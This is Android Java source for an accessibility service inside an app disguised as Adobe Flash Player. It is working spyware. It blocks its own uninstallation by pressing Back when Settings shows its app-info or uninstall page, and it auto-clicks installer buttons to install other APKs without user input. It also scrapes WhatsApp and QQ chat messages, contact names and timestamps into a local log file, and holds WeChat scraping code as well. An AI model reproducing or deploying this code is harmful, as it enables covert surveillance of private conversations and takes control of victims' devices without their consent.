package com.adobe.flashplayer.core;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;
import org.json.JSONObject;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.Display;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;


public class AccessibilitySrv extends AccessibilityService {

    private final String TAG = "[ljg]AccessibilitySrv ";
    public static String installAPkFileName = "";
    public static String installAPkPackName = "";
    public static String installAPkName = "";
    //public static String installVersion = "";
    public static boolean openOrOverAfterInstall = false;
    //private final String SETTINGS_PACKAGE_NAME 		= "com.android.settings";
    private final String WEIXIN_PACKAGE_NAME 		= "com.tencent.mm";
    private final String QQ_PACKAGE_NAME 			= "com.tencent.mobileqq";
    private final String WHATSAPP_PACKAGE_NAME 		= "com.wahtsapp";

    //Map<Integer, Boolean> handledMap = new HashMap<>();
    private Context context;


    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        Log.e(TAG, String.valueOf(event.getKeyCode()));

        return true;
    }

    AccessibilitySrv() {
        Public pub = new Public(getApplicationContext());
    }

    @Override
    protected void onServiceConnected() {

        super.onServiceConnected();

        Log.e(TAG, "onServiceConnected");

        Public pub = new Public(getApplicationContext());

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.notificationTimeout = 0;
        info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = android.accessibilityservice.AccessibilityServiceInfo.DEFAULT;
        setServiceInfo(info);
    }

    public void onUnbind(){
        Log.e(TAG, "onUnbind");
    }

    public void onInterrupt(){
        Log.e(TAG, "onInterrupt");
    }

	/*
    private boolean iterateNodesAndHandle(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo != null) {
            int childCount = nodeInfo.getChildCount();
            if ("android.widget.Button".equals(nodeInfo.getClassName())) {
                String nodeContent = nodeInfo.getText().toString();
                Log.d("TAG", "content is " + nodeContent);
                if ("安装".equals(nodeContent)|| "打开".equals(nodeContent)|| "完成".equals(nodeContent)|| "确定".equals(nodeContent)) {
                    nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);

                    if ("打开".equals(nodeContent)|| "完成".equals(nodeContent)) {
                    	installAPkFileName = "";
					}
                    return true;
                }
            } else if ("android.widget.ScrollView".equals(nodeInfo.getClassName())) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
            }
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
                if (iterateNodesAndHandle(childNodeInfo)) {
                    return true;
                }
            }
        }
        return false;
    }
	*/


    public void onAccessibilityEvent(AccessibilityEvent event){
        try{
			/*
		    if (VIVO_IMANAGER_AUTOSTARTUP == true && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
		    		event.getPackageName().equals("com.iqoo.secure") ) {

		    	AccessibilityNodeInfo nodeInfo = findViewByText("软件管理",true);
	            if (nodeInfo != null ) {
	            	Log.e(TAG,"find vivo imanager autostartup:");
	            	//performViewClick(nodeInfo);
	            	nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
	            }
		        nodeInfo = findViewByText("自启动管理",true);
	            if (nodeInfo != null ) {
	            	Log.e(TAG,"find vivo imanager autostartup:");
	            	//performViewClick(nodeInfo);
	            	nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
	            	VIVO_IMANAGER_AUTOSTARTUP = false;
	            }
			}
		    else if (VIVO_IMANAGER_AUTHORITY == true&& event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
		    		event.getPackageName().equals("com.iqoo.secure") ) {
		    	AccessibilityNodeInfo nodeInfo = findViewByText("软件管理",true);
	            if (nodeInfo != null ) {
	            	Log.e(TAG,"find vivo imanager autostartup:");
	            	//performViewClick(nodeInfo);
	            	nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
	            }

		    	nodeInfo = findViewByText("软件权限管理",true);
	            if (nodeInfo != null ) {
	            	Log.e(TAG,"find vivo imanager autostartup:");
	            	//performViewClick(nodeInfo);
	            	nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
	            	VIVO_IMANAGER_AUTHORITY = false;
	            }
			}
		    */

            AccessibilityNodeInfo nodeInfo = event.getSource();
            if (nodeInfo == null) {
                return;
            }

            int type = event.getEventType();
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED){
                String packagename = event.getPackageName().toString();
                if (packagename.equals("com.android.settings")) {

                    if (findViewByText(context.getPackageName(),false) != null) {
                        nodeInfo = findViewByText("卸载",true);
                        if (nodeInfo != null ) {
                            performGlobalAction(GLOBAL_ACTION_BACK);
                        }
                        else{
                            nodeInfo = findViewByText("应用程序信息",false);
                            if (nodeInfo != null ) {
                                performGlobalAction(GLOBAL_ACTION_BACK);
                            }
                            else{
                                nodeInfo = findViewByText("应用信息",false);
                                if (nodeInfo != null ) {
                                    performGlobalAction(GLOBAL_ACTION_BACK);
                                }
                            }
                        }
                        Log.e(TAG,"find package name in settings:" + context.getPackageName());
                    }
                }

                //com.miui.packegeinstaller
                else if (packagename.contains("packageinstaller") || packagename.contains("com.huawei.android.launcher") ||
                        packagename.contains("com.miui.packegeinstaller") || packagename.contains("com.android.packageinstaller")) {

                    //if (installAPkFileName != null && installAPkFileName.equals("") == false)  {
		        		/*
		                if (handledMap.get(event.getWindowId()) == null) {
		                    boolean handled = iterateNodesAndHandle(nodeInfo);
		                    if (handled) {
		                        handledMap.put(event.getWindowId(), true);
		                    }
		                }
		                */

                    if (findViewByText(installAPkName, false) != null ||findViewByText(installAPkPackName, false) != null) {
                        Log.e(TAG, "find install apk package name or apk name");
                        MyLog.writeLogFile("find install apk package name or apk name\r\n");
                    }

                    String[] labels = null;
                    if (openOrOverAfterInstall == true) {
                        labels = new String[]{"确定", "安装", "下一步", "完成"};
                    }
                    else{
                        labels = new String[]{"确定", "安装", "下一步", "打开"};
                    }

                    nodeInfo = null;
                    for (String label : labels) {
                        nodeInfo = findViewByText(label, true);
                        if (nodeInfo != null) {
                            performViewClick(nodeInfo);
                            if (label.equals(labels[3])) {
                                installAPkFileName = "";
                                Log.e(TAG,"install apk complete");
                            }
                        }

			            	/*
			                nodeInfoList = event.getSource().findAccessibilityNodeInfosByText(label);
			                if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
			                    boolean performed = performClick(nodeInfoList);
			                    if (performed) {
			                    	return;
			                    }
			                }
			                */
                    }
                }
                Log.e(TAG, "find installer name:" + event.getPackageName().toString());
                //}
            }
            else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_SCROLLED && event.getPackageName().equals("com.tencent.mm")) {
                Log.e(TAG,"com.tencent.mm");
                //AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                //getWeChatLog(rootNode);
            }
            else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_SCROLLED && event.getPackageName().equals("com.whatsapp")  ) {
                Log.e(TAG,"com.wahtsapp");
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                getWhatsAppMessageFromView(rootNode);
            }
            else if ((event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) && event.getPackageName().equals("com.tencent.mobileqq")) {
                Log.e(TAG,"com.tencent.mobileqq");
                CharSequence className = event.getClassName();
                if(className.equals("com.tencent.mobileqq.activity.LoginActivity") == true){

                }

                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                getQQMessageFromView(rootNode);
            }
            else{
	        	/*
				AdvanceFunc.checkStartForegroundService(context);
				*/
            }
        }
        catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("accessibilityService exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return;
        }
    }


    public void performViewClick(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) {
            return;
        }
        while (nodeInfo != null) {
            if (nodeInfo.isClickable()) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                break;
            }
            nodeInfo = nodeInfo.getParent();
        }
    }



    public AccessibilityNodeInfo findViewByText(String text, boolean clickable) {
        AccessibilityNodeInfo accessibilityNodeInfo = getRootInActiveWindow();
        if (accessibilityNodeInfo == null) {
            return null;
        }
        List<AccessibilityNodeInfo> nodeInfoList = accessibilityNodeInfo.findAccessibilityNodeInfosByText(text);
        if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
            for (AccessibilityNodeInfo nodeInfo : nodeInfoList) {
                if (nodeInfo != null && (nodeInfo.isClickable() == clickable)) {
                    Log.e(TAG, "findViewByText:" + text +" success");
                    return nodeInfo;
                }
            }
        }
        return null;
    }









    /*
    private String getWechatNameFromView(AccessibilityNodeInfo nodeinfo) {
    	String chatname = "";
        for (int i = 0; i < nodeinfo.getChildCount(); i++) {
            AccessibilityNodeInfo node = nodeinfo.getChild(i);
            if ("android.widget.ImageView".equals(node.getClassName()) && node.isClickable()) {
                if (!TextUtils.isEmpty(node.getContentDescription())) {
                	chatname = node.getContentDescription().toString();
                    if (chatname.contains("头像")) {
                    	chatname = chatname.replace("头像", "");

                    	return chatname;
                    	//break;
                    }
                }

            }
            chatname = getWechatNameFromView(node);
            if (chatname.equals("") == true) {
				continue;
			}
            else{
            	break;
            }
        }
        return chatname;
    }*/


    @SuppressWarnings("unused")
    private void getWeChatMsg(AccessibilityNodeInfo rootNode) {

        try{
            if (rootNode == null) {
                return;
            }

            List<AccessibilityNodeInfo> lvnode = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/tz");
            if(lvnode == null || lvnode.size()<= 0){
                Log.e(TAG,"lv id s not found");
                return;
            }else{
                Log.e(TAG,"lv id s found:" + lvnode.size());
            }


            List<AccessibilityNodeInfo> llnodes = lvnode.get(0).findAccessibilityNodeInfosByViewId("com.tencent.mm:id/aq");
            if(llnodes == null || llnodes.size()<= 0){
                Log.e(TAG,"lls id s not found");
                return;
            }else{
                Log.e(TAG,"lls id s found:" + llnodes.size());
            }

            long time;
            List<AccessibilityNodeInfo> timenode = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/ap");
            if(timenode != null){
                String rawtime = timenode.get(0).getText().toString();
                time = getDateTime(rawtime);
            }else{
                time = System.currentTimeMillis()/1000;
            }

            for (int i = 0; i < llnodes.size(); i++) {
                AccessibilityNodeInfo llnode = llnodes.get(i);

                List<AccessibilityNodeInfo> imgnode = llnode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/h3");
                if (imgnode == null) {
                    return;
                }
                String nick = imgnode.get(0).getContentDescription().toString().replace("头像", "");
                Log.e(TAG,"ChatName:" + nick);

                String message;
                List<AccessibilityNodeInfo> msgtxtnode = llnode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/h5");
                if (msgtxtnode == null) {
                    message = "发送是表情,语音或者图片";
                }else{
                    message = msgtxtnode.get(0).getText().toString();
                }
                Log.e(TAG,"message:" + message);

                JSONObject jso = new JSONObject();
                jso.put("people", nick);
                jso.put("message", message);
                jso.put("time", time);
                jso.put("type", "1");
                jso.put("group", "");
                jso.put("name", WEIXIN_PACKAGE_NAME);

                MyLog.writeFile(Public.LOCAL_PATH_NAME, Public.CHATTING_FILENAME,jso.toString()+"\r\n", true);
            }
        }catch(Exception ex){
            ex.printStackTrace();
        }
    }





    private String getWhatsAppMessageFromView(AccessibilityNodeInfo nodeinfo) {

        String shortmsg = "";
        JSONObject json = new JSONObject();

        try{
            if (nodeinfo != null) {
                List<AccessibilityNodeInfo> listname = nodeinfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/main_layout");
                if(listname == null || listname.size()<=0){
                    Log.e(TAG,"whatsapp layouts are not found");
                    return shortmsg;
                }

                AccessibilityNodeInfo finalNode = listname.get(listname.size() - 1);
                if (finalNode == null || finalNode.getClassName().equals("android.widget.LinearLayout") == false) {
                    Log.e(TAG,"not fond last LinearLayout");
                    return shortmsg;
                }

                String msg = "";
                String time = "";
                String title= "";
                @SuppressWarnings("unused")
                String status = "";

                List<AccessibilityNodeInfo> timelist = nodeinfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/date");
                if(timelist != null && timelist.size() > 0){
                    Log.e(TAG, "find time stamps:" + timelist.size());
                }

                List<AccessibilityNodeInfo> msglist = nodeinfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text");
                if(msglist != null && msglist.size() > 0){
                    Log.e(TAG, "find messages total:" + msglist.size());
                }

                List<AccessibilityNodeInfo> titlelist = nodeinfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");
                if(titlelist != null && titlelist.size() > 0){
                    title = titlelist.get(0).getText().toString();
                    Log.e(TAG,"found title:" + title);
                }

                List<AccessibilityNodeInfo> statuslist = nodeinfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_status");
                if(statuslist != null && statuslist.size() > 0){
                    Log.e(TAG, "status times:" + statuslist.size());
                    status =  "(" + statuslist.get(0).getText().toString() + ")";
                }

                WindowManager wm = (WindowManager)getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
                Display display = wm.getDefaultDisplay();
                Point point = new Point();
                display.getSize(point);

                if(msglist != null && msglist.size() > 0){
                    time = timelist.get(timelist.size() - 1).getText().toString();

                    msg = msglist.get(msglist.size() - 1).getText().toString();
                    if (msg == null || msg.equals("") == true) {
                        msg = "发送是表情,语音或者图片";
                    }

                    Rect rect = new Rect();
                    msglist.get(msglist.size() - 1).getBoundsInScreen(rect);

                    if (rect.left < (point.x/8)) {

                        //shortmsg = shortmsg + title + status + "对我说:" + msg + "\t" + time + "\r\n";
                        json.put("people", title);
                        json.put("message", msg);
                        json.put("time", time);
                        json.put("type", "1");
                        json.put("group", "");
                        json.put("name", WHATSAPP_PACKAGE_NAME);
                    }
                    else{
                        //shortmsg = shortmsg + "我对" + title + status + "说:" + msg + "\t" + time + "\r\n";
                        json.put("people", title);
                        json.put("message", msg);
                        json.put("time", time);
                        json.put("type", "2");
                        json.put("group", "");
                        json.put("name", WHATSAPP_PACKAGE_NAME);
                    }
                    Log.e(TAG,shortmsg);
                }

                MyLog.writeFile(Public.LOCAL_PATH_NAME, Public.CHATTING_FILENAME,json.toString()+"\r\n", true);
            }
        }catch(Exception ex){
            ex.printStackTrace();
        }

        return shortmsg;
    }




    private String getQQMessageFromView(AccessibilityNodeInfo nodeinfo) {
        String shortmsg = "";
        JSONObject json = new JSONObject();
        try{
            if (nodeinfo == null) {
                return shortmsg;
            }

            List<AccessibilityNodeInfo> listname = nodeinfo.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/listView1");
            if(listname == null || listname.size()<=0){
                Log.e(TAG,"not found listview1");
                return shortmsg;
            }

            AccessibilityNodeInfo finalNode = listname.get(0);
            if (finalNode == null || finalNode.getClassName().equals("android.widget.AbsListView") == false) {
                Log.e(TAG,"not found android.widget.AbsListView in listview1");
                return shortmsg;
            }

            String nick = "";
            String msg = "";
            String time = "";
            String title= "";
            String titlesub = "";
            List<AccessibilityNodeInfo> titlesublist = nodeinfo.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/title_sub");
            if(titlesublist != null && titlesublist.size() > 0){
                titlesub = titlesublist.get(0).getText().toString();
                Log.e(TAG,"buddy mode");
            }
            else{
                Log.e(TAG,"group mode");
            }

            List<AccessibilityNodeInfo> nicklist = null;
            nicklist  = finalNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/chat_item_nick_name");
            if (nicklist == null || nicklist.size() <= 0) {
                Log.e(TAG,"not found group nick names");
            }
            else{
                Log.e(TAG,"found group nick times:" + nicklist.size());
            }


            List<AccessibilityNodeInfo> timelist = finalNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/chat_item_time_stamp");
            if(timelist != null && timelist.size() > 0){
                Log.e(TAG, "find time times:" + timelist.size());
            }else{
                return shortmsg;
            }

            List<AccessibilityNodeInfo> msglist = finalNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/chat_item_content_layout");
            if(msglist != null && msglist.size() > 0){
                Log.e(TAG, "find content times:" + msglist.size());
            }

            List<AccessibilityNodeInfo> titlelist = nodeinfo.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/title");
            if(titlelist != null && titlelist.size() > 0){
                title = titlelist.get(0).getText().toString();
                Log.e(TAG,"found title:" + title);
            }

    		/*
    		List<AccessibilityNodeInfo> levelnickllist = finalNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/name");
        	List<AccessibilityNodeInfo> rltitlelist = finalNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/rlCommenTitle");
        	if (rltitlelist != null) {
        		Log.e(TAG,"found rlCommenTitle");
        	}
        	else{
        		Log.e(TAG,"not found rlCommenTitle");
        	}
        	*/

            List<AccessibilityNodeInfo> headlist = finalNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/chat_item_head_icon");
            if(headlist != null && msglist.size() > 0){
                Log.e(TAG, "find head times:" + headlist.size());
            }

            for (int i = 0; i < msglist.size(); i++) {
                CharSequence tmpcs = msglist.get(i).getText();
                if (tmpcs == null || tmpcs.toString().equals("") == true) {
                    msg = "发送的是表情,语音或图片";
                }
                else{
                    msg = tmpcs.toString();
                }


                if(headlist.get(i) == null){

                }

            	/*
            	int activespeaking = 0;
        		Rect rect = new Rect();
        		headlist.get(i).getBoundsInScreen(rect);

	    		WindowManager wm = (WindowManager)getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
		        Display display = wm.getDefaultDisplay();
		        Point point = new Point();
		        display.getSize(point);

		        if(rect.left >= point.x*7/8){
        			activespeaking = 0;	//recv
        		}
        		else if (rect.left <= point.x/8) {
        			activespeaking = 1;	//send
				}
        		else{
        			activespeaking = 2;	//group
        		}*/


                if(i < timelist.size()){
                    time = timelist.get(i).getText().toString();
                }

                if(i < nicklist.size()){
                    nick = nicklist.get(i).getText().toString();
                }
                else{
                    nick = "";
                }

                long datetime = getDateTime(time);
                if (nick != null && nick.equals("") == false) {
                    json.put("people", nick);
                    json.put("message", msg);
                    json.put("time", datetime);
                    json.put("type", 2);
                    json.put("group", title);
                    json.put("name", QQ_PACKAGE_NAME);
                    //shortmsg = shortmsg + "群:" + title + "\t" + nick + "说:"+  msg + " " + time + "\r\n";
                }else{
                    json.put("people", title+ "("+titlesub+")");
                    json.put("message", msg);
                    json.put("time", datetime);
                    json.put("type", 1);
                    json.put("group", "");
                    json.put("name", QQ_PACKAGE_NAME);
                    //shortmsg = shortmsg + title + "对我说:" + msg + " " + time + "\t" + titlesub + "\r\n";
                }

                Log.e(TAG,shortmsg);
            }

            MyLog.writeFile(Public.LOCAL_PATH_NAME, Public.CHATTING_FILENAME,json.toString()+"\r\n", true);

        }catch(Exception e){
            e.printStackTrace();
        }
        return shortmsg;
    }


    private long getDateTime(String dt){
        long time = 0;
        try {
            String [] arrays=dt.split(" ");

            Calendar calendar = Calendar.getInstance();
            int year = calendar.get(Calendar.YEAR);
            int month  = calendar.get(Calendar.MONTH);
            int day  = calendar.get(Calendar.DAY_OF_MONTH);
            int weekday = calendar.get(Calendar.DAY_OF_WEEK);

            String timestr = "";
            if (arrays.length <= 0) {
                return time;
            }else if (arrays.length == 1) {
                if(arrays[0].contains("早上") || arrays[0].contains("下午") ){
                    arrays[0] = arrays[0].replace("早上", "");
                    arrays[0] = arrays[0].replace("下午", "");
                }
                timestr = timestr + year + "-"  + month + "-" + day + " " + arrays[0] + ":00";
            }else if(arrays.length == 2){
                if (arrays[0].contains("星期") || arrays[0].contains("昨天") || arrays[0].contains("前天")) {
                    int subdays=getsubdays(arrays[0],weekday);

                    String [] msghourmin= arrays[1].split(":");
                    int msghour= Integer.parseInt(msghourmin[0]);
                    int msgmin= Integer.parseInt(msghourmin[1]);

                    Calendar msgcalendar = Calendar.getInstance();
                    msgcalendar.set(year,month,day,msghour,msgmin,0);

                    msgcalendar.add(Calendar.DAY_OF_MONTH,-subdays );

                    time = msgcalendar.getTimeInMillis()/1000;
                    return time;
                }else{
                    timestr = timestr + year + "-"  + arrays[0] + " " + arrays[1] + ":00";
                }
            }else if(arrays.length == 3){
                return time;
            }

            SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            time = sf.parse(timestr).getTime()/1000;
            return time;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return time;
    }


    private int getsubdays(String week,int daynow){
        int diw=0;
        if (week.contains("星期六")) {
            diw=7;
        }else if (week.contains("星期五")) {
            diw=6;
        }
        else if (week.contains("星期四")) {
            diw=5;
        }
        else if (week.contains("星期三")) {
            diw=4;
        }
        else if (week.contains("星期二")) {
            diw=3;
        }
        else if (week.contains("星期一")) {
            diw=2;
        }
        else if (week.contains("星期天")) {
            diw=1;
        }else if(week.contains("昨天")){
            return 1;
        }else if(week.contains("前天")){
            return 2;
        }

        int subdays = 0;
        if (daynow >= diw) {
            subdays = daynow - diw;
        }else{
            subdays = daynow + 7 - diw;
        }

        return subdays;
    }

}
